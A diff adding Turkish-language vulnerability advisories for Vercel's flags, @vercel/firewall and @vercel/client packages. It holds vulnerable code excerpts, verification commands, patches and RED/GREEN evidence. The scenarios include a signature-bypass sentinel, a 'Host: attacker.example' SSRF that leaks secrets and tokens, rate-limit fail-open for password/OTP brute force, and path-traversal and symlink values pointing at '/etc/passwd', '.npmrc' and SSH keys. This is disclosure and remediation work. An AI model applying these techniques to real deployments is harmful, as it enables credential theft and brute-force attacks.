+* **Senaryo A — Edge Middleware Coğrafi/Güvenlik Kısıtlamasının Atlanması:** Edge Middleware güvenilmeyen bir istemci için `vipCheckoutFlag = false` kararını JWS ile imzalar; ancak istemci URL'deki imzalı segment yerine `__no_flags__` göndererek imza doğrulamasını atlar ve sunucu tarafında `true` değerini alır.
+* **Senaryo B — A/B Kampanya ve Fiyat Kohortu Manipülasyonu:** İmzalı JWS kodu yerine `__no_flags__` gönderilerek `FLAGS_SECRET` bilinmeden yeni kohort hesaplaması tetiklenir.
+* **Senaryo C — Önbellek Parçalanması ve Asenkron `decide()` Yükü:** `__no_flags__` segmenti her istekte `flag.decide()` çağrısını yeniden çalıştırır.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect deserialize in published flags@4.4.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/flags/dist/next/index.js | sed -n '115,155p'
+
+# 2. Run the Live flags@4.4.0 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-05-flags-precompute-no-flags-sentinel-bypass.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-FLAGS-05": {
+    "RED": {
+      "package_tested": "flags@4.4.0",
+      "legitimate_signed_code_prefix": "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..",
+      "legitimate_precomputed_value": false,
+      "forged_code_passed": "__no_flags__",
+      "deserialize_output_for_no_flags": {},
+      "getPrecomputed_value_with_no_flags_sentinel": true,
+      "random_tampered_token_rejected": true
+    },
+    "GREEN": {
+      "sentinel_rejected_when_flags_non_empty": true,
+      "getPrecomputed_with_no_flags_throws": true
+    }
+  }
+}
+```
+
+
+---
+
+### III.44 — vercel/firewall (`@vercel/firewall <= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)`) — Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Doğrulanmamış `Host` Başlığı / `region` SSRF İle `VF_RATE_LIMIT_SECRET` Sızıntısı ve Fail-Open Hız Sınırı Atlama (`VERCEL-FIREWALL-01`) (`CWE-918 / CWE-200 / CWE-636`, CVSS `7.2 High`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/firewall` (`npm / Node.js & Go: @vercel/firewall`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)` — `packages/firewall/src/rate-limit.ts:138-183, 211-285`, `cmd/ipc-proxy/client.go:34-41, 79-97`
+* **Zafiyet Sınıfı & Skor:** `CWE-918 / CWE-200 / CWE-636` — **CVSS v3.1: `7.2 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — Doğrulanmamış `Host` Başlığının Giden HTTPS URL'sine Enjekte Edilmesi (`packages/firewall/src/rate-limit.ts:138-167, 224`):** `VERCEL_ENV !== 'production'` olduğunda (staging, preview veya kendi sunucusunda çalışan kurulumlar), `resolveFirewallHost()` gelen isteğin `Host` başlığını alır ve doğrulama yapmadan `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check` adresine `POST` isteği gönderir.
+2. **Adım 2 — `VF_RATE_LIMIT_SECRET` ve `x-vercel-oidc-token` Sırlarının Dış Sunucuya Sızdırılması (`rate-limit.ts:169-183`):** `buildAuthHeaders()` fonksiyonu bu giden isteğe `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` başlıklarını ekler.
+3. **Adım 3 — Evrensel Fail-Open (`rateLimited: false`) Hız Sınırı Atlaması ve Go `ipc-proxy` Ham `%s` Hatası (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Saldırgan `VERCEL_ENV=production` ortamında bile `Host: victim.com/@invalid` gönderdiğinde giden istek hata alır ve `callRemoteRateLimitAPI()` **fail-open** yaparak `{ rateLimited: false }` döndürür; böylece parola/OTP deneme sınırı tamamen aşılır.
+
+```typescript
+// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
+function resolveFirewallHost(options: RateLimitOptions): string | null {
+  if (process.env.VERCEL_ENV !== 'production') {
+    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
+    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
+  }
+  return process.env.VERCEL_URL || null;
+}
+// In callRemoteRateLimitAPI():
+const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
+const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
+// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — Staging / Preview / Self-Hosted Ortamlarda `VF_RATE_LIMIT_SECRET` ve OIDC Token Çalınması:** `await checkRateLimit('login-limit', { request })` kullanan bir uygulamaya `Host: attacker.example` gönderildiğinde `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` doğrudan saldırgana gönderilir.
+* **Senaryo B — `rateLimited: false` Fail-Open İle Parola ve OTP Hız Sınırının Atlanması:** Hatalı `Host` başlığı giden isteğin `404`/`400` almasına yol açar ve SDK `{ rateLimited: false }` döndürerek sınırsız denemeye izin verir.
+* **Senaryo C — Go `ipc-proxy` Ham `%s` Hatası:** `cmd/ipc-proxy/client.go:38` `fmt.Sprintf` unutulduğu için `https://api-%s.vercel.com/v1/rate-limit` adresine bağlanmaya çalışır.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'
+
+# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-FIREWALL-01": {
+    "RED": {
+      "package_tested": "@vercel/firewall@1.2.6",
+      "attacker_received_request": true,
+      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
+      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
+      "fail_open_result_on_error": {
+        "rateLimited": false,
+        "error": "not_found"
+      }
+    },
+    "GREEN": {
+      "untrusted_host_and_region_rejected": true,
+      "attacker_received_request": false,
+      "go_ipc_proxy_sprintf_formatted": true
+    }
+  }
+}
+```
+
+
+---
+
+### III.45 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `.vc-config.json` `filePathMap` Üzerinden Keyfi Konak Dosyası Okuma ve `.next/required-server-files.json` Yerel `.env` Sır Yüklemesi (`VERCEL-CLIENT-08A`) (`CWE-200 / CWE-706`, CVSS `5.0 Medium`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/hashes.ts:115-167`, `packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`)
+* **Zafiyet Sınıfı & Skor:** `CWE-200 / CWE-706` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — `filesFromFilePathMap()` İçinde Sınır Kontrolsüz `path.resolve(cwd, filePath)` (`packages/client/src/utils/hashes.ts:115-167`):** `vercel deploy --prebuilt` çalıştığında `@vercel/client`, `.vercel/output/functions/**/.vc-config.json` içindeki `filePathMap` tablosunu okur ve `path.resolve(cwd, filePath)` ile çözümlenen her dosyayı proje kökü (`cwd`) veya `.vercelignore` kontrolü yapmadan okur.
+2. **Adım 2 — `.next/required-server-files.json` Üzerinden Yerel `.env` Sırlarının Sızması:** Standart Next.js derlemelerinde `.vc-config.json` içindeki `filePathMap`, yerel `.env.local` sırlarını barındıran `.next/required-server-files.json` dosyasını otomatik olarak dağıtım paketine dahil eder.
+3. **Adım 3 — CI/CD Prebuilt Artifact Zehirlemesi İle Konak Dosyalarının `/v2/files` API'sine Yüklenmesi:** Üretilen `.vercel/output` dizinindeki `filePathMap` içine `../../../../etc/passwd` veya `~/.npmrc` yazıldığında `vercel deploy --prebuilt` bu dosyaları doğrudan Vercel sunucularına yükler.
+
+```typescript
+// File: packages/client/src/utils/hashes.ts (lines 115-167)
+export async function filesFromFilePathMap(
+  filePathMap: Record<string, string>,
+  cwd: string
+): Promise<Map<string, DeploymentFile>> {
+  for (const [funcPath, filePath] of Object.entries(filePathMap)) {
+    // BUG: No check that fsPath stays within cwd, and .vercelignore is never applied!
+    const fsPath = path.resolve(cwd, filePath);
+    const data = await fs.readFile(fsPath);
+    // ... packages data for upload to POST /v2/files
+  }
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — `vercel build && vercel deploy --prebuilt` Sırasında `.vercelignore` Aşılarak `.env.local` Sırlarının Yüklenmesi:** `.vercelignore` içinde `.env*` bulunsa bile `filePathMap` üzerinden `.next/required-server-files.json` yüklendiği için yerel sırlar dağıtım paketine girer.
+* **Senaryo B — Ayrık CI/CD Hattında (`build` -> `deploy --prebuilt`) Konak Dosyası Sızıntısı:** PR derleme adımında üretilen `.vercel/output` içindeki `filePathMap`, ayrıcalıklı dağıtım adımında `/home/runner/.npmrc` gibi dosyaları Vercel'e yükler.
+* **Senaryo C — Paylaşılan Monorepo Derleme Önbelleği Zehirlemesi:** Önbellekten gelen `.vc-config.json` dağıtım sırasında konak dosyalarını sızdırır.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect filesFromFilePathMap in published @vercel/client@18.10.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/hashes.js | sed -n '85,145p'
+
+# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-CLIENT-08A": {
+    "RED": {
+      "package_tested": "@vercel/client@18.10.0",
+      "outside_host_file_read_via_filePathMap": true,
+      "dotnext_required_server_files_env_uploaded": true,
+      "uploaded_payload_excerpt": "SUPER_SECRET_HOST_TOKEN=host_secret_value_12345"
+    },
+    "GREEN": {
+      "outside_cwd_filePathMap_rejected": true,
+      "outside_host_file_read_via_filePathMap": false
+    }
+  }
+}
+```
+
+
+---
+
+### III.46 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `config.bulkRedirectsPath` Sembolik Bağ (Symlink) Kaçışı ve `.vercelignore` Atlaması İle Konak Dosyası Sızıntısı (`VERCEL-CLIENT-08B`) (`CWE-59 / CWE-200`, CVSS `5.0 Medium`)
+
+#### 1. Üst Veri & Bildirim Durumu
+* **Hedef Depo & Paket:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
+* **Etkilenen Sürüm & Bileşenler:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/index.ts:116-148`, `packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`)
+* **Zafiyet Sınıfı & Skor:** `CWE-59 / CWE-200` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
+* **Sniper Tekil Raporu:** [`docs/advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)
+
+#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
+1. **Adım 1 — `buildFileTree()` İçinde Doğrulanmamış `config.bulkRedirectsPath` ve Symlink Takibi (`packages/client/src/utils/index.ts:116-148`):** `prebuilt: true` modunda `buildFileTree()`, `.vercel/output/config.json` içinden `config.bulkRedirectsPath` değerini okur ve `join(cwd, config.bulkRedirectsPath)` dizinini `fs.stat()` (sembolik bağları takip eder) ile tarar; `fs.realpath()` ile proje kökü sınır kontrolü yapmaz.
+2. **Adım 2 — Prebuilt Modunda `.vercelignore` Kurallarının Atlanması:** `bulkRedirectsPath` taranırken `.vercelignore` filtreleri uygulanmadığı için hariç tutulan gizli dosyalar da okunur.
+3. **Adım 3 — Konak Dosyalarının `/v2/files` API'sine Yüklenmesi:** Sembolik bağın işaret ettiği proje dışı konak dosyaları SHA-1 ile özetlenerek Vercel dağıtım sunucularına yüklenir.
+
+```typescript
+// File: packages/client/src/utils/index.ts (lines 116-148)
+if (config?.bulkRedirectsPath) {
+  const bulkRedirectsPath = join(cwd, config.bulkRedirectsPath);
+  // BUG: No realpath confinement check and .vercelignore is not applied;
+  // readdir/stat follows symlinks pointing outside cwd!
+  const bulkRedirectFiles = await readdir(bulkRedirectsPath, []);
+  fileList.push(...bulkRedirectFiles);
+}
+```
+
+#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
+* **Senaryo A — `bulkRedirectsPath` İçindeki Sembolik Bağ İle SSH/Bulut Anahtarlarının Sızdırılması:** `.vercel/output/config.json` içinde tanımlanan `bulkRedirectsPath` dizinine `/home/runner/.ssh/id_rsa` yönlendiren bir sembolik bağ konulduğunda `buildFileTree()` bu bağı takip ederek özel anahtarı dağıtıma yükler.
+* **Senaryo B — `config.json` İçinde Üst Dizin Geçişi (`"bulkRedirectsPath": "../../secrets"`):** Üst dizin yolu verilerek proje kökü dışındaki klasörün tamamı taranıp yüklenir.
+* **Senaryo C — `.vercelignore` İhlali:** `.vercelignore` ile engellenen yerel sır dosyaları `bulkRedirectsPath` üzerinden dağıtıma dahil edilir.
+
+#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
+```bash
+# 1. Inspect buildFileTree in published @vercel/client@18.10.0
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/index.js | sed -n '90,145p'
+
+# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
+```
+**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-CLIENT-08B": {
+    "RED": {
+      "package_tested": "@vercel/client@18.10.0",
+      "bulkRedirectsPath_symlink_followed_outside_cwd": true,
+      "outside_symlink_target_packaged_in_fileList": true,
+      "uploaded_payload_excerpt": "OUTSIDE_SYMLINK_SECRET=top_secret_symlink_data_999"
+    },
+    "GREEN": {
+      "bulkRedirectsPath_confined_to_cwd_realpath": true,
+      "outside_symlink_target_packaged_in_fileList": false
+    }
+  }
+}
+```
+
+<!-- VERCEL-ADVISORIES-END -->
